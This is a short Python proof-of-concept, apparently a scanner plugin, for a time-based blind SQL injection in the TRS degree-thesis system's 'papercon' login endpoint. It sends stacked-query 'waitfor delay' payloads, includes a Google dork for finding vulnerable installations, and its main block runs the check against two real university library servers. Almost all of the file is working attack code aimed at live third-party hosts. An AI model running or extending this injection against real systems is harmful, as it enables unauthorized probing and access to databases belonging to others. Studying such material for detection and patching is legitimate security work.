#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: TRS学位论文系统papercon处SQL注入
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2010-0124453
description:
    paper/submit1.jsp POST
    stacked queries; AND/OR time-based blind
google dork: intitle:"学位论文服务系统"
'''
import time

def assign(service, arg):
    if service == 'trs_lunwen':
        return True, arg

def audit(arg):
    url = arg + 'papercon'
    delay_0 = 'action=login&r_code=%D1%A7%BA%C5%B2%BB%C4%DC%CE%AA%BF%D5&r_password=%C3%DC%C2%EB%B2%BB%C4%DC%CE%AA%BF%D5&code=test%27;waitfor%20delay%270:0:0%27--&password=dsdfaf'
    delay_5 = 'action=login&r_code=%D1%A7%BA%C5%B2%BB%C4%DC%CE%AA%BF%D5&r_password=%C3%DC%C2%EB%B2%BB%C4%DC%CE%AA%BF%D5&code=test%27;waitfor%20delay%270:0:5%27--&password=dsdfaf'
    code, head, res, err, _ = curl.curl2(arg + 'papercon')  #这句好像并没有什么用，然而加上这句能提高准确率
    content_type = 'Content-Type: application/x-www-form-urlencoded'
    t1 = time.time()
    code, head, res, err, _ = curl.curl2(url, post=delay_0, header=content_type)
    #print code, head
    if code >= 400:
        return False
    t2 = time.time()
    code, head, res, err, _ = curl.curl2(url, post=delay_5, header=content_type)
    if code >= 400:
        return False
    t3 = time.time()
    #debug("t0:" + str(t2-t1) + " t5:" + str(t3-t2))
    if(t1 + t3 - 2*t2) > 3:
        security_hole("SQL Injection: " + url + " POST:" +delay_5)
        
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('trs_lunwen','http://epaper.lib.bnu.edu.cn:8080/')[1])
    audit(assign('trs_lunwen','http://thesis.lib.tsinghua.edu.cn:8001/')[1])